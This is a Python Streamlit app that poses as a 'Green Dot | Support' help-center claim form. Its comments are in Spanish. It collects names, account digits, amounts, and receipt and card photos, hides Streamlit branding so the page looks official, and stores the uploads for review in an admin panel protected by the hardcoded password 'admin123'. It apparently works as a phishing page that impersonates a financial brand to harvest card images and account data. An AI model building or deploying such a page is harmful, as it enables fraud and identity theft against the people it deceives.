
import streamlit as st
import sqlite3
import os
import random
import string
import pandas as pd
from datetime import datetime

# Configuración de Rutas
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

def generate_ref():
    chars = string.ascii_uppercase + string.digits
    return "GD-" + "".join(random.choice(chars) for _ in range(8))

init_db()

st.set_page_config(page_title="Green Dot | Support", layout="centered", page_icon="✅")

# Ocultar elementos de Streamlit
st.markdown("<style>header, footer, .stDeployButton {display: none !important;}</style>", unsafe_allow_html=True)

# Sidebar para navegación (Modo Administrador)
menu = st.sidebar.selectbox("Navigation", ["Claim Form", "Admin Panel"])

if menu == "Claim Form":
    if os.path.exists('logo.svg'):
        st.image('logo.svg', width=160)
    
    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")

    with st.form("claim_form", clear_on_submit=True):
        nombre = st.text_input("Full Name")
        cuenta = st.text_input("Last 4 digits of Account")
        monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
        car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
        submitted = st.form_submit_button("SUBMIT NOW")

    if submitted:
        if nombre and rec and car:
            ref_id = generate_ref()
            f_path = os.path.join(UPLOAD_DIR, f"f_{ref_id}_{rec.name}")
            t_path = os.path.join(UPLOAD_DIR, f"t_{ref_id}_{car.name}")
            
            with open(f_path, "wb") as f: f.write(rec.getbuffer())
            with open(t_path, "wb") as f: f.write(car.getbuffer())

            # PERSISTENCIA EN DB
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("INSERT INTO greendot_submissions (nombre, cuenta, monto, factura_path, tarjeta_path, fecha, ref_id) VALUES (?,?,?,?,?,?,?)",
                      (nombre, cuenta, monto, f_path, t_path, str(datetime.now()), ref_id))
            conn.commit()
            conn.close()

            st.success(f"✅ Submitted! Ref: {ref_id}")
        else:
            st.error("Complete all fields.")

elif menu == "Admin Panel":
    st.title("🔐 Admin Dashboard")
    password = st.text_input("Enter Admin Password", type="password")
    
    if password == "admin123":
        conn = sqlite3.connect(DB_NAME)
        df = pd.read_sql_query("SELECT * FROM greendot_submissions ORDER BY id DESC", conn)
        conn.close()

        if not df.empty:
            st.dataframe(df[['id', 'ref_id', 'nombre', 'cuenta', 'monto', 'fecha']])
            
            st.markdown("--- CORE EVIDENCE ---")
            for _, row in df.iterrows():
                with st.expander(f"View Claim {row['ref_id']} - {row['nombre']}"):
                    col1, col2 = st.columns(2)
                    with col1:
                        st.image(row['factura_path'], caption="Receipt")
                    with col2:
                        st.image(row['tarjeta_path'], caption="Card")
        else:
            st.info("No claims found in database.")
    elif password:
        st.error("Invalid Password")
